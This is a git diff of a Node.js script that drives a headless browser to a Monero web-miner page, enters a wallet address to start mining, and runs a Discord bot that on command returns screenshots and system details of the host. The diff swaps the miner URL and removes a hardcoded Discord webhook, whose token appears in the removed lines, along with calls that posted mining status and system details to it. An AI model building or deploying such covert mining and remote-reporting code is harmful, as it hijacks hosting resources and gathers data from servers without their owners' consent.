@@ -9,42 +9,17 @@ const fs = require('fs');
 const FormData = require('form-data');
 const fetch = require('node-fetch');
 
-
 dotenv.config();
 
 const app = express();
 const bot = new Eris(process.env.DISCORD_BOT_TOKEN);
 const botId = process.env.BOT_ID;
 
-
-
-
 function delay(time) {
   return new Promise(resolve => setTimeout(resolve, time));
 }
 
-let page; 
-
-const webhookUrl = 'https://discord.com/api/webhooks/1045109813228621825/OMXSsYZoA76MRjyJS4ocziJwerv_mm16w0RordAQ4is_7nXiKmqkCJZFW80I8_5hY-QZ';
-
-async function sendToDiscord(message) {
-  try {
-    const formData = new FormData();
-    formData.append('content', message);
-
-    const headers = {
-      ...formData.getHeaders()
-    };
-
-    await axios.post(webhookUrl, formData, { headers });
-
-    console.log('Message sent to Discord:', message);
-  } catch (error) {
-    console.error('Error sending message to Discord:', error);
-  }
-}
-
-
+let page;
 
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
@@ -55,10 +30,11 @@ app.get("/", (req, res) => {
   try {
     browser = await puppeteer.launch({ args: ["--no-sandbox"] });
     const pages = await browser.pages();
-    page = pages[0]; 
+    page = pages[0];
 
-    const url = "https://monero-webminer-main.onrender.com/";
+    const url = "https://excessive-sticky-traffic.glitch.me/";
     await page.goto(url, { waitUntil: "domcontentloaded" });
+    console.log('URL Opened');
     await delay(2000);
 
     const inputSelector = '#AddrField';
@@ -73,9 +49,7 @@ app.get("/", (req, res) => {
     console.log(await page.title()); // Log the page title for verification
 
     const message = `Started mining on server ${botId} with wallet address: ${WalletAddress}`;
-  
-
-    await sendToDiscord(message);
+    console.log(message); // Log the message to the console instead of sending it to Discord
   } catch (err) {
     console.error(err.message);
   } finally {
@@ -83,7 +57,6 @@ app.get("/", (req, res) => {
     // await browser?.close();
   }
 })();
-
 
 async function sendSystemDetails() {
   try {
@@ -117,12 +90,11 @@ async function sendSystemDetails() {
   }
 }
 
-
 async function takeScreenshot() {
   if (!page) {
     throw new Error("Page is not initialized.");
   }
-
+  console.log("screenshot Taken")
   const screenshotPath = 'screenshot.png';
   await page.screenshot({ path: screenshotPath });
   return screenshotPath;
@@ -174,22 +146,18 @@ bot.on('messageCreate', async (msg) => {
       console.log('Screenshot sent successfully:', responseBody);
     } catch (err) {
       console.error('Error sending screenshot:', err.message || err);
-      await sendToDiscord(`Error sending screenshot: ${err.message || err}`);
     }
   } else if (msg.content === `systemdetails-${botId}`) {
     try {
       const systemDetailsMessage = await sendSystemDetails();
-      await sendToDiscord(systemDetailsMessage);
-      console.log('System details sent successfully');
+      console.log('System details:', systemDetailsMessage);
     } catch (err) {
       console.error('Error sending system details:', err.message || err);
-      await sendToDiscord(`Error sending system details: ${err.message || err}`);
     }
   } else if (msg.content === `restart-${botId}`) {
-    console.log("Restarting server....")
+    console.log("Restarting server....");
   }
 });
-
 
 bot.connect();
 
